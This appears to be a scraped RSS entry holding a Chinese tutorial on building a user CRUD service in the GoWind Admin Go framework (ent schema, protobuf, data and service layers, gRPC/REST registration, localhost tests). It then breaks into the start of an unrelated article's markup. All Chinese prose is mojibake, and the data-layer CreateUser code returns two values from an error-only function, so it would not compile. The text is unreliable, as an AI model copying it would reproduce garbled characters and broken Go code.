<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// Annotations é…ç½®è¡¨åŸºæœ¬ä¿¡æ¯</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(User)</span></span> Annotations() []schema.Annotation {
    <span class="hljs-keyword">return</span> []schema.Annotation{
        entsql.Annotation{
            Table:     <span class="hljs-string">"sys_users"</span>, <span class="hljs-comment">// æ•°æ®åº“è¡¨å</span>
            Charset:   <span class="hljs-string">"utf8mb4"</span>,   <span class="hljs-comment">// å­—ç¬¦é›†</span>
            Collation: <span class="hljs-string">"utf8mb4_bin"</span>, <span class="hljs-comment">// æ’åºè§„åˆ™</span>
        },
        schema.Comment(<span class="hljs-string">"ç”¨æˆ·è¡¨"</span>), <span class="hljs-comment">// è¡¨æ³¨é‡Š</span>
    }
}

<span class="hljs-comment">// Fields å®šä¹‰è¡¨å­—æ®µ</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(User)</span></span> Fields() []ent.Field {
    <span class="hljs-keyword">return</span> []ent.Field{
        field.String(<span class="hljs-string">"username"</span>).
            Comment(<span class="hljs-string">"ç”¨æˆ·å"</span>).
            Unique().       <span class="hljs-comment">// å”¯ä¸€ç´¢å¼•</span>
            NotEmpty().     <span class="hljs-comment">// éç©º</span>
            Immutable(),    <span class="hljs-comment">// åˆ›å»ºåä¸å¯ä¿®æ”¹</span>

        field.String(<span class="hljs-string">"password"</span>).
            Comment(<span class="hljs-string">"ç™»å½•å¯†ç "</span>).
            MaxLen(<span class="hljs-number">255</span>).    <span class="hljs-comment">// æœ€å¤§é•¿åº¦</span>
            Sensitive(),    <span class="hljs-comment">// æ•æ„Ÿå­—æ®µï¼ˆæ—¥å¿—ä¸­éšè—ï¼‰</span>

        <span class="hljs-comment">// å…¶ä»–å­—æ®µ...</span>
    }
}

<span class="hljs-comment">// Mixin å¤ç”¨é€šç”¨é…ç½®</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(User)</span></span> Mixin() []ent.Mixin {
    <span class="hljs-keyword">return</span> []ent.Mixin{
        mixin.AutoIncrementId{}, <span class="hljs-comment">// è‡ªå¢ ID</span>
        mixin.TimeAt{},          <span class="hljs-comment">// åˆ›å»ºæ—¶é—´ã€æ›´æ–°æ—¶é—´</span>
        mixin.OperatorID{},      <span class="hljs-comment">// åˆ›å»ºè€…ã€æ›´æ–°è€… ID</span>
    }
}
</code></pre>
<h4 data-id="heading-8">ç”Ÿæˆ ent ä»£ç ï¼š</h4>
<p>ç¼–å†™å®Œ schema åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆå®ä½“ä»£ç ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> backend/app/admin/service/
make ent
</code></pre>
<h3 data-id="heading-9">ä¸‰ã€ç¼–å†™ gRPC çš„ proto æ–‡ä»¶</h3>
<p>Protobufï¼ˆprotoï¼‰ç”¨äºå®šä¹‰ gRPC æœåŠ¡æ¥å£å’Œæ•°æ®ç»“æ„ï¼Œæ˜¯æœåŠ¡å¯¹å¤–æš´éœ²çš„ â€œå¥‘çº¦â€ã€‚proto æ–‡ä»¶é€šå¸¸ä½äº <code>backend/api/proto/user/service/v1</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-10">æ­¥éª¤è¯´æ˜ï¼š</h4>
<ol>
<li>å®šä¹‰æœåŠ¡æ¥å£ï¼ˆ<code>service UserService</code>ï¼‰ï¼ŒåŒ…å« CRUD æ–¹æ³•ï¼ˆå¦‚ <code>CreateUser</code>ã€<code>ListUser</code>ï¼‰ã€‚</li>
<li>å®šä¹‰è¯·æ±‚ / å“åº”æ¶ˆæ¯ï¼ˆmessageï¼‰ï¼Œæ˜ å°„æ•°æ®åº“å­—æ®µå’Œä¸šåŠ¡éœ€æ±‚ã€‚</li>
<li>å®šä¹‰æšä¸¾ï¼ˆenumï¼‰ï¼Œå¦‚ç”¨æˆ·çŠ¶æ€ã€æ€§åˆ«ç­‰å›ºå®šå€¼ç±»å‹ã€‚</li>
</ol>
<h4 data-id="heading-11">å…³é”®ä»£ç è§£æï¼š</h4>
<pre><code class="hljs language-protobuf" lang="protobuf">// backend/api/proto/user/service/v1/user.proto

// å®šä¹‰æœåŠ¡æ¥å£
service UserService {
  rpc ListUser (pagination.PagingRequest) returns (ListUserResponse); // åˆ—è¡¨æŸ¥è¯¢
  rpc GetUser (GetUserRequest) returns (User);                        // è¯¦æƒ…æŸ¥è¯¢
  rpc CreateUser (CreateUserRequest) returns (google.protobuf.Empty); // åˆ›å»º
  rpc UpdateUser (UpdateUserRequest) returns (google.protobuf.Empty); // æ›´æ–°
  rpc DeleteUser (DeleteUserRequest) returns (google.protobuf.Empty); // åˆ é™¤
}

// æšä¸¾å®šä¹‰ï¼ˆç”¨æˆ·çŠ¶æ€ï¼‰
enum UserStatus {
  OFF = 0; // ç¦ç”¨
  ON = 1;  // å¯ç”¨
}

// æ•°æ®æ¨¡å‹ï¼ˆä¸æ•°æ®åº“è¡¨å¯¹åº”ï¼‰
message User {
  optional uint32 id = 1 [json_name = "id"]; // ç”¨æˆ·ID
  optional string username = 2;              // ç”¨æˆ·å
  optional UserStatus status = 3;            // çŠ¶æ€
  // å…¶ä»–å­—æ®µ...
}
</code></pre>
<h4 data-id="heading-12">ç”Ÿæˆ Go ä»£ç ï¼š</h4>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°† proto è½¬æ¢ä¸º Go ä»£ç ï¼ˆç”Ÿæˆçš„ä»£ç ä½äº <code>backend/api/gen/go</code> ç›®å½•ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">make api
</code></pre>
<h3 data-id="heading-13">å››ã€ç¼–å†™ REST çš„ proto æ–‡ä»¶</h3>
<p>Protobufï¼ˆprotoï¼‰ç”¨äºå®šä¹‰ REST æœåŠ¡æ¥å£å’Œæ•°æ®ç»“æ„ï¼Œæ˜¯æœåŠ¡å¯¹å¤–æš´éœ²çš„ â€œå¥‘çº¦â€ã€‚proto æ–‡ä»¶é€šå¸¸ä½äº <code>backend/api/proto/admin/service/v1</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-14">å…³é”®ä»£ç è§£æï¼š</h4>
<pre><code class="hljs language-protobuf" lang="protobuf">// backend/api/proto/admin/service/v1/i_user.proto

import "user/service/v1/user.proto";

// ç”¨æˆ·ç®¡ç†æœåŠ¡
service UserService {
  // è·å–ç”¨æˆ·åˆ—è¡¨
  rpc List (pagination.PagingRequest) returns (user.service.v1.ListUserResponse) {
    option (redact.v3.internal_method) = true;
    option (google.api.http) = {
      get: "/admin/v1/users"
    };
  }

  // è·å–ç”¨æˆ·æ•°æ®
  rpc Get (user.service.v1.GetUserRequest) returns (user.service.v1.User) {
    option (redact.v3.internal_method) = true;
    option (google.api.http) = {
      get: "/admin/v1/users/{id}"
      additional_bindings {
        get: "/admin/v1/users/username/{user_name}"
      }
    };
  }

  // åˆ›å»ºç”¨æˆ·
  rpc Create (user.service.v1.CreateUserRequest) returns (google.protobuf.Empty) {
    option (google.api.http) = {
      post: "/admin/v1/users"
      body: "*"
    };
  }

  // æ›´æ–°ç”¨æˆ·
  rpc Update (user.service.v1.UpdateUserRequest) returns (google.protobuf.Empty) {
    option (google.api.http) = {
      put: "/admin/v1/users/{id}"
      body: "*"
    };
  }

  // åˆ é™¤ç”¨æˆ·
  rpc Delete (user.service.v1.DeleteUserRequest) returns (google.protobuf.Empty) {
    option (google.api.http) = {
      delete: "/admin/v1/users/{id}"
    };
  }
}

// æšä¸¾å®šä¹‰ï¼ˆç”¨æˆ·çŠ¶æ€ï¼‰
enum UserStatus {
  OFF = 0; // ç¦ç”¨
  ON = 1;  // å¯ç”¨
}

// æ•°æ®æ¨¡å‹ï¼ˆä¸æ•°æ®åº“è¡¨å¯¹åº”ï¼‰
message User {
  optional uint32 id = 1 [json_name = "id"]; // ç”¨æˆ·ID
  optional string username = 2;              // ç”¨æˆ·å
  optional UserStatus status = 3;            // çŠ¶æ€
  // å…¶ä»–å­—æ®µ...
}
</code></pre>
<h4 data-id="heading-15">ç”Ÿæˆä»£ç ï¼š</h4>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°† proto è½¬æ¢ä¸º Go ä»£ç ï¼ˆç”Ÿæˆçš„ä»£ç ä½äº <code>backend/api/gen/go</code> ç›®å½•ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆgoä»£ç </span>
make api
</code></pre>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°† proto è½¬æ¢ä¸º OpenAPIæ–‡æ¡£ï¼ˆç”Ÿæˆçš„æ–‡æ¡£ä½äº<code>backend/app/admin/service/cmd/server/assets/</code>ç›®å½•ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”ŸæˆOpenAPIæ–‡æ¡£</span>
make openapi
</code></pre>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°† proto è½¬æ¢ä¸º TypeScriptä»£ç ï¼ˆç”Ÿæˆçš„ä»£ç ä½äº<code>frontend/apps/admin/src/generated/api</code>ç›®å½•ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”ŸæˆTypeScriptä»£ç </span>
make ts
</code></pre>
<h3 data-id="heading-16">äº”ã€ç¼–å†™ data åŒ…ï¼ˆæ•°æ®è®¿é—®å±‚ï¼‰</h3>
<p><code>data</code> åŒ…è´Ÿè´£ä¸æ•°æ®åº“äº¤äº’ï¼Œå®ç° CRUD æ“ä½œï¼Œæ˜¯ä¸šåŠ¡é€»è¾‘ä¸æ•°æ®åº“ä¹‹é—´çš„æ¡¥æ¢ã€‚ä»£ç ä½äº <code>backend/app/admin/service/internal/data</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-17">æ ¸å¿ƒèŒè´£ï¼š</h4>
<ul>
<li>å°è£… ent çš„æ•°æ®åº“æ“ä½œï¼ˆæŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°ã€åˆ é™¤ï¼‰ã€‚</li>
<li>å®ç° ent å®ä½“ä¸ proto æ¶ˆæ¯çš„è½¬æ¢ï¼ˆå¦‚ <code>convertEntToProto</code>ï¼‰ã€‚</li>
<li>å¤„ç†æ•°æ®è®¿é—®è¿‡ç¨‹ä¸­çš„é”™è¯¯ï¼ˆå¦‚è®°å½•æ—¥å¿—ã€è¿”å›ä¸šåŠ¡é”™è¯¯ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-18">å…³é”®ä»£ç è§£æï¼š</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> data

<span class="hljs-keyword">type</span> UserRepo <span class="hljs-keyword">struct</span> {
	data *Data
	log  *log.Helper

	mapper             *mapper.CopierMapper[userV1.User, ent.User]
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewUserRepo</span><span class="hljs-params">(logger log.Logger, data *Data)</span></span> *UserRepo {
	repo := &amp;UserRepo{
		log:                log.NewHelper(log.With(logger, <span class="hljs-string">"module"</span>, <span class="hljs-string">"user/repo/admin-service"</span>)),
		data:               data,
		mapper:             mapper.NewCopierMapper[userV1.User, ent.User](),
	}

	<span class="hljs-keyword">return</span> repo
}

<span class="hljs-comment">// åˆ›å»ºç”¨æˆ·</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *UserRepo)</span></span> CreateUser(ctx context.Context, req *userV1.CreateUserRequest) <span class="hljs-type">error</span> {
	<span class="hljs-keyword">if</span> req == <span class="hljs-literal">nil</span> || req.Data == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, userV1.ErrorBadRequest(<span class="hljs-string">"invalid parameter"</span>)
	}

	<span class="hljs-keyword">if</span> req.Data.Password != <span class="hljs-literal">nil</span> &amp;&amp; req.Data.GetPassword() != <span class="hljs-string">""</span> {
		cryptoPassword, err := crypto.HashPassword(req.Data.GetPassword())
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
		}
		req.Data.Password = &amp;cryptoPassword
	}

    <span class="hljs-comment">// è°ƒç”¨ ent æ’å…¥æ•°æ®</span>
    <span class="hljs-keyword">return</span> r.data.db.Client().User.Create().
        SetUsername(req.Data.Username).
        SetPassword(req.Data.GetPassword()).
        <span class="hljs-comment">// è®¾ç½®å…¶ä»–å­—æ®µ...</span>
        Exec(ctx)
}
</code></pre>
<h3 data-id="heading-19">å…­ã€ç¼–å†™ service åŒ…ï¼ˆä¸šåŠ¡é€»è¾‘å±‚ï¼‰</h3>
<p>service åŒ…å®ç°æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼Œè°ƒç”¨ data åŒ…è¿›è¡Œæ•°æ®æ“ä½œï¼Œå¹¶å¤„ç†æƒé™æ ¡éªŒã€å‚æ•°æ ¡éªŒç­‰ä¸šåŠ¡è§„åˆ™ã€‚ä»£ç ä½äº <code>backend/app/admin/service/internal/service</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-20">æ ¸å¿ƒèŒè´£ï¼š</h4>
<ul>
<li>æ ¡éªŒè¯·æ±‚å‚æ•°åˆæ³•æ€§ï¼ˆå¦‚éç©ºæ£€æŸ¥ï¼‰ã€‚</li>
<li>å®ç°ä¸šåŠ¡è§„åˆ™ï¼ˆå¦‚ â€œç¦æ­¢åˆ é™¤è¶…çº§ç®¡ç†å‘˜â€ï¼‰ã€‚</li>
<li>è°ƒç”¨ data åŒ…å®Œæˆæ•°æ®æ“ä½œï¼Œå¹¶è¿”å›ç»“æœã€‚</li>
</ul>
<h4 data-id="heading-21">å…³é”®ä»£ç è§£æï¼š</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åˆ›å»ºç”¨æˆ·ï¼ˆåŒ…å«æƒé™æ ¡éªŒï¼‰</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *UserService)</span></span> CreateUser(ctx context.Context, req *userV1.CreateUserRequest) (*emptypb.Empty, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// å‚æ•°æ ¡éªŒ</span>
    <span class="hljs-keyword">if</span> req.Data == <span class="hljs-literal">nil</span> || req.Data.Username == <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)
    }

    <span class="hljs-comment">// æƒé™æ ¡éªŒï¼šåªæœ‰ç®¡ç†å‘˜èƒ½åˆ›å»ºç”¨æˆ·</span>
    operator, err := s.userRepo.GetUser(ctx, req.OperatorId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || operator.Authority != userV1.UserAuthority_SYS_ADMIN {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">"æƒé™ä¸è¶³"</span>)
    }

    <span class="hljs-comment">// è°ƒç”¨ data åŒ…åˆ›å»ºç”¨æˆ·</span>
    <span class="hljs-keyword">return</span> &amp;emptypb.Empty{}, s.userRepo.CreateUser(ctx, req)
}
</code></pre>
<h3 data-id="heading-22">ä¸ƒã€æ³¨å†ŒæœåŠ¡åˆ° Server</h3>
<p>æœ€åéœ€å°†æœåŠ¡æ³¨å†Œåˆ° gRPC æˆ– REST æœåŠ¡å™¨ï¼Œä½¿å®¢æˆ·ç«¯èƒ½è®¿é—®æœåŠ¡ã€‚æ³¨å†Œä»£ç ä½äº <code>backend/app/admin/service/server</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-23">gRPC æœåŠ¡æ³¨å†Œï¼š</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> (
	<span class="hljs-string">"github.com/go-kratos/kratos/v2/transport/grpc"</span>
)

<span class="hljs-comment">// æ³¨å†Œ gRPC æœåŠ¡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewGRPCServer</span><span class="hljs-params">(cfg *conf.Bootstrap, userSvc *service.UserService)</span></span> *grpc.Server {
    srv := grpc.NewServer()

    <span class="hljs-comment">// å°† UserService æ³¨å†Œåˆ° gRPC æœåŠ¡å™¨</span>
    userV1.RegisterUserServiceServer(srv, userSvc)

    <span class="hljs-keyword">return</span> srv
}
</code></pre>
<h4 data-id="heading-24">REST æœåŠ¡æ³¨å†Œï¼š</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> (
	<span class="hljs-string">"github.com/go-kratos/kratos/v2/transport/http"</span>
)

<span class="hljs-comment">// æ³¨å†Œ REST æœåŠ¡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewRESTServer</span><span class="hljs-params">(cfg *conf.Bootstrap, userSvc *service.UserService)</span></span> *http.Server {
	<span class="hljs-keyword">if</span> cfg == <span class="hljs-literal">nil</span> || cfg.Server == <span class="hljs-literal">nil</span> || cfg.Server.Rest == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	}

	srv := rpc.CreateRestServer(cfg)
   
	<span class="hljs-comment">// å°† UserService æ³¨å†Œåˆ° REST æœåŠ¡å™¨</span>
	adminV1.RegisterUserServiceHTTPServer(srv, userSvc)

	<span class="hljs-keyword">return</span> srv
}
</code></pre>
<h3 data-id="heading-25">å…«ã€æµ‹è¯•æ–°æœåŠ¡</h3>
<p>æœåŠ¡å¼€å‘å®Œæˆåï¼Œéœ€éªŒè¯åŠŸèƒ½æ­£ç¡®æ€§ï¼š</p>
<h4 data-id="heading-26">1. <strong>å•å…ƒæµ‹è¯•ï¼š</strong></h4>
<p>æµ‹è¯• data åŒ…å’Œ service åŒ…çš„æ ¸å¿ƒæ–¹æ³•ï¼ˆä½¿ç”¨ Go å†…ç½®æµ‹è¯•æ¡†æ¶ï¼‰ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// backend/app/admin/service/internal/service/user_service_test.go</span>
<span class="hljs-keyword">package</span> service_test

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"context"</span>
    <span class="hljs-string">"testing"</span>

    <span class="hljs-string">"github.com/stretchr/testify/assert"</span>
    userV1 <span class="hljs-string">"go-wind-admin/api/gen/go/admin/service/v1"</span>
    <span class="hljs-string">"go-wind-admin/app/admin/service/internal/service"</span>
    <span class="hljs-string">"go-wind-admin/mocks"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestCreateUser</span><span class="hljs-params">(t *testing.T)</span></span> {
    <span class="hljs-comment">// åˆå§‹åŒ– mock ä¾èµ–</span>
    mockUserRepo := mocks.NewUserRepo(t)
    svc := service.NewUserService(mockUserRepo, <span class="hljs-literal">nil</span>)

    <span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ï¼šç”¨æˆ·åç©º</span>
    req := &amp;userV1.CreateUserRequest{Password: <span class="hljs-string">"12345678"</span>}
    _, err := svc.CreateUser(context.Background(), req)
    assert.ErrorContains(t, err, <span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)

    <span class="hljs-comment">// å…¶ä»–æµ‹è¯•ç”¨ä¾‹...</span>
}
</code></pre>
<h4 data-id="heading-27">2. <strong>æ¥å£æµ‹è¯•ï¼š</strong></h4>
<h5 data-id="heading-28">gRPC æ¥å£</h5>
<p>ä½¿ç”¨ <code>grpcurl</code> è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ—å‡ºæœåŠ¡æ¥å£</span>
grpcurl -plaintext localhost:9000 list admin.service.v1.UserService

<span class="hljs-comment"># è°ƒç”¨åˆ›å»ºç”¨æˆ·æ¥å£</span>
grpcurl -plaintext -d <span class="hljs-string">'{"username":"test","password":"12345678"}'</span> \
  localhost:9000 admin.service.v1.UserService/CreateUser
</code></pre>
<h5 data-id="heading-29">HTTP æ¥å£</h5>
<p>ä½¿ç”¨ curl æˆ– Postman è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºç”¨æˆ·</span>
curl -X POST http://localhost:8080/admin/v1/users \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{"username":"test","password":"12345678"}'</span>
</code></pre>
<h3 data-id="heading-30">æ€»ç»“</h3>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªæ–°æœåŠ¡ä»æ•°æ®åº“è®¾è®¡åˆ°æ¥å£æš´éœ²çš„å…¨æµç¨‹å®ç°ã€‚GoWind Admin æ¡†æ¶çš„åˆ†å±‚æ¶æ„ï¼ˆschema â†’ data â†’ service â†’ serverï¼‰ç¡®ä¿äº†ä»£ç çš„ä½è€¦åˆä¸é«˜å¯ç»´æŠ¤æ€§ï¼š</p>
<ul>
<li><strong>schema å±‚</strong>ï¼šé€šè¿‡ ent å®šä¹‰æ•°æ®ç»“æ„ï¼Œè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“æ“ä½œä»£ç ã€‚</li>
<li><strong>data å±‚</strong>ï¼šå°è£…æ•°æ®åº“äº¤äº’ï¼Œéš”ç¦»ä¸šåŠ¡é€»è¾‘ä¸æ•°æ®è®¿é—®ã€‚</li>
<li><strong>service å±‚</strong>ï¼šèšç„¦ä¸šåŠ¡è§„åˆ™ï¼Œä¸æ•°æ®å±‚è§£è€¦ã€‚</li>
<li><strong>server å±‚</strong>ï¼šç»Ÿä¸€æ³¨å†ŒæœåŠ¡ï¼Œç®€åŒ–éƒ¨ç½²ä¸æ‰©å±•ã€‚</li>
</ul>
<p>éµå¾ªæ­¤æµç¨‹ï¼Œå¼€å‘è€…å¯å¿«é€Ÿåœ¨æ¡†æ¶ä¸­æ‰©å±•æ–°æœåŠ¡ï¼Œå……åˆ†åˆ©ç”¨æ¡†æ¶æä¾›çš„å·¥å…·é“¾ï¼ˆentã€Protobufã€gRPCï¼‰æå‡å¼€å‘æ•ˆç‡ã€‚</p>
<h3 data-id="heading-31">é¡¹ç›®ä»£ç </h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://gitee.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">go-wind-admin Gitee</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://github.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">go-wind-admin Github</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ¨¡å‹ MoE,ä½ æ˜ç™½äº†ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582424649783705600</link>    <guid>https://juejin.cn/post/7582424649783705600</guid>    <pubDate>2025-12-11T16:44:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582424649783705600" data-draft-id="7582358932028899343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ¨¡å‹ MoE,ä½ æ˜ç™½äº†ä¹ˆï¼Ÿ "/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM"/> <meta itemprop="datePublished" content="2025-12-11T16:44:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å´ä½³æµ©"/> <meta itemprop="url" content="https://juejin.cn/user/2696441245481975"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ¨¡å‹ MoE,ä½ æ˜ç™½äº†ä¹ˆï¼Ÿ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2696441245481975/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å´ä½³æµ©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T16:44:25.000Z" title="Thu Dec 11 2025 16:44:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{font-family:-apple-system,system-ui,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial;color:#00325e}.markdown-body ::selection{background-color:#00325e;color:#fff}.markdown-body blockquote{padding:10px 20px;background-color:#fffaf0;box-shadow:0 3px 10px 0 rgba(255,172,194,.24);border:1px solid #f3ca8e;transition:all .2s;margin:1em 0;border-radius:5px}.markdown-body blockquote p{font-size:14px;line-height:25px;color:#795548}.markdown-body blockquote p:last-child{margin:0}.markdown-body blockquote:hover{border-color:#ff9800;background-color:#fff8e0;box-shadow:0 6px 10px -5px rgba(225,173,98,.3803921569)}.markdown-body blockquote code{color:#ff502c}.markdown-body pre{border:1px solid #8cc0f3;box-shadow:0 3px 10px 0 rgba(255,198,198,.28);border-radius:5px;transition:all .2s;overflow-x:auto;white-space:pre-wrap}.markdown-body pre:hover{border-color:#6d9dce}.markdown-body pre&gt;code{padding:10px 20px;color:#00325e;background:#f0f8ff;font-size:12px;line-height:1.6;display:block}.markdown-body code{background:#f6fbff;color:#0b5393;padding:2px 4px;border-radius:4px;font-size:12px}.markdown-body p{font-size:14px;line-height:28px;text-align:justify;margin-bottom:17px;color:#595959}.markdown-body a{color:#00325e;text-decoration:none}.markdown-body a:after{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAQdJREFUKFNt0DtLA0EUBeBzZle0Eks7rcUfEfBRCha7NorYa6NmVJzgyi4smUgKtdZGCJktLMVH4Y8QeztLWyE7VyLEuNFbXj4Oh0P8c8mZm+uJrEN4BJFTeP/MUVe3bnocfALwkOlo1zS7iZAzf6Cx7oXgbaqjxiDEWCcVaGyxQ8pSWo9XhqhoQ/xUFbaKjhe5V+CmR7mnSplEEF6GSmJ+F/d0KHvbCIIJCLc85U6BC5mONgbJNM3uFag++sX7z8O8MzsWBucifMx0dDGE1kmm458KDVukAlnNdDz/exEeW3dNkbfsYC0xtmgDWP6ELLZ0/F6BJu/UoFQN5AkoeUjeJPvx6+i+X5Sjah4tA6gYAAAAAElFTkSuQmCC);margin-left:2px}.markdown-body a:hover{box-shadow:0 1px}.markdown-body table{max-width:100%;border-collapse:collapse;border-spacing:0;box-shadow:0 3px 10px 0 rgba(255,238,172,.24);transition:all .2s}.markdown-body table:hover{box-shadow:0 3px 10px 0 rgba(185,169,103,.24)}.markdown-body table tr th{border:1px solid #8cc0f3;background-color:#f0f8ff;padding:12px 15px}.markdown-body table tr td{border:1px solid rgba(243,202,142,.4);padding:12px 15px}.markdown-body table tbody tr{transition:all .2s}.markdown-body table tbody tr:hover td{border-color:#f3ca8e;background-color:#fff8e0;z-index:1}.markdown-body img{max-width:100%}.markdown-body 